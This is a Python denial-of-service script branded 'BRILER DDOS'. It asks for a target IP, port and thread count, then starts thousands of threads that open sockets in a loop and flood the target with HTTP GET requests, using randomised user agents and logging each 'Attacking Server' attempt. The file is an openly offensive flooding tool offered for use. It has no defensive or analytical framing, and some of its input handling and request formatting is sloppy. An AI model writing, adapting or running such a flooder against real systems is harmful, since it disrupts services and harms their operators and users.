import time
import socket
import threading
from fake_useragent import UserAgent
from colorama import Fore, init, ansi

init()
ansi.clear_screen()

print(
    f"""{Fore.CYAN}

██████╗░██████╗░██╗██╗░░░░░███████╗██████╗░
██╔══██╗██╔══██╗██║██║░░░░░██╔════╝██╔══██╗
██████╦╝██████╔╝██║██║░░░░░█████╗░░██████╔╝
██╔══██╗██╔══██╗██║██║░░░░░██╔══╝░░██╔══██╗
██████╦╝██║░░██║██║███████╗███████╗██║░░██║
╚═════╝░╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
-------------------------------------------
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
    {Fore.YELLOW}NOTE: CTRL + C If you want to Quit.{Fore.RESET}
"""
)

address = ''
while not address:
    address = input(f'Ip: ')

port = input(f'Port {Fore.CYAN}(80 by default){Fore.RESET}: ') or 80
threads = input(f'Threads {Fore.CYAN}(2000 by default){Fore.RESET}: ') or 2000

# Starting fun
user_agents = UserAgent()

headers = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive'''


packages = 0


def dos() -> None:
    global packages
    packages += 1
    while 1:
        try:
            # Configure packet
            packet = f'GET / HTTP/1.1\nHost: {address}\n\n User-Agent: {user_agents.random}\n{headers}'
            packet = packet.encode('utf-8')

            # Sending packet
            s = socket.socket()
            s.connect((address, port))
            s.sendto(packet, (address, port))
            s.send(packet)

            # Simple logging
            current_time = time.ctime(time.time())
            print(f'{Fore.GREEN}{current_time} Attacking Server->{address}')
        except socket.error:
            # Simple logging
            current_time = time.ctime(time.time())
            print(f'{Fore.RED}{current_time} ERROR Attacking Server->{address}')


# Here is some shit code
def dos2() -> None:
    while True:
        dos()


# Launching threads
for i in range(threads):
    threading.Thread(target=dos).start()
    threading.Thread(target=dos2).start()
